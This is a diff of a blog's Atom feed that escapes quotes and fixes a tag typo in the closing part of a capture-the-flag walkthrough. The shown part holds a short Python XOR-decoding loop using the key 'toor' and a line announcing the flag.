 &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# key = toor
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
@@ -501,7 +1129,7 @@ By doing an NMAP on the IP address we can see that a port 8080 is open which is 
 	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;outputfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'%c'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;outputfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;%c&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inputfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;outputfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -512,4 +1140,4 @@ By doing an NMAP on the IP address we can see that a port 8080 is open which is 
 
 &lt;p&gt;And here is the flag.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/sector443/bin_flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeoprady" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of Sector443's CTF</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/images/sector443/bin_flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeopardy" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of Sector443&apos;s CTF</summary></entry></feed>
